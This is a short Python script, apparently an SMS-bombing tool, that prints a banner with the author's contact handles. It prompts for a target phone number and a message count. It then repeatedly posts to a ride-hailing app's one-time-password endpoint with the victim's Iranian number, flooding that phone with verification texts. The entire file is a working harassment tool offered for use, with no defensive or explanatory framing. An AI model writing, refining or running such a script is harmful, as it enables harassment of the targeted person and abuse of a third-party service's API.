import os
import requests as r
os.system("clear")
#Colors
R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white
############
def Baner():

    print(f"{G}")

    print('███╗   ███╗ ██████╗ ██╗  ██╗ ██████╗     ████████╗███╗   ███╗')
    print('████╗ ████║██╔═══██╗██║  ██║██╔═══██╗    ╚══██╔══╝████╗ ████║')
    print('██╔████╔██║██║   ██║███████║██║   ██║       ██║   ██╔████╔██║')
    print('██║╚██╔╝██║██║   ██║██╔══██║██║▄▄ ██║       ██║   ██║╚██╔╝██║')
    print('██║ ╚═╝ ██║╚██████╔╝██║  ██║╚██████╔╝       ██║   ██║ ╚═╝ ██║')
    print('╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚══▀▀═╝        ╚═╝   ╚═╝     ╚═╝')
    print(f'{G}                            ************************************')
    print('                            ** Telegram : @Hamiyan_Haj_Qassem **')
    print('                            **     Email : mohq@gmail.com     **')
    print('                            ************************************')
def Start():
    Baner()
    #Phone 
    phone=str(input(f"{C}Phone Target {R}=>{C}"))
    #Sms Send
    sms_send=int(input(f"{C}Add Sms Sending {R}=> {C}"))
    #Url For Sending Sms
    url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    params=dict(cellphone=f"+98{phone}")
    for i in range(0,sms_send):
        r.session()
        req=r.post(url,params=params)
Start()
